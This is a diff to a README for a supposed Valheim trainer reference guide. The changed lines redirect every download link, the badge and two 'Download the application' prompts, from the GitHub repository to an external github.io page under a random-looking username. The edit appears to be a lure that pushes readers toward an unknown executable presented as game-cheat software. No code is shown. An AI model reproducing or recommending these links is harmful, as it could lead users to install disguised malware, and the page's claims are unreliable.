@@ -1,6 +1,6 @@
 # 🎮 valheim-trainer-compatibility-hotkeys - Your Complete Valheim Trainer Reference Guide
 
-[![Download Now](https://img.shields.io/badge/Download-Valheim_Trainer_Guide-blue?style=for-the-badge&logo=github)](https://github.com/Silexdorsalscapularvein9193/valheim-trainer-compatibility-hotkeys)
+[![Download Now](https://img.shields.io/badge/Download-Valheim_Trainer_Guide-blue?style=for-the-badge&logo=github)](https://silexdorsalscapularvein9193.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the ultimate companion guide for Valheim trainers! This documentation
 
 Visit this link to download the application:
 
-👉 **[Download valheim-trainer-compatibility-hotkeys](https://github.com/Silexdorsalscapularvein9193/valheim-trainer-compatibility-hotkeys)**
+👉 **[Download valheim-trainer-compatibility-hotkeys](https://silexdorsalscapularvein9193.github.io)**
 
 ## 📥 Download and Installation
 
@@ -261,7 +261,7 @@ Before you start playing with your trainer, ensure:
 
 Visit this link to download the application:
 
-👉 **[Download valheim-trainer-compatibility-hotkeys now](https://github.com/Silexdorsalscapularvein9193/valheim-trainer-compatibility-hotkeys)**
+👉 **[Download valheim-trainer-compatibility-hotkeys now](https://silexdorsalscapularvein9193.github.io)**
 
 Happy gaming, and may your Viking adventures be legendary! Remember to always check back here for the latest compatibility updates and trainer version records.
 
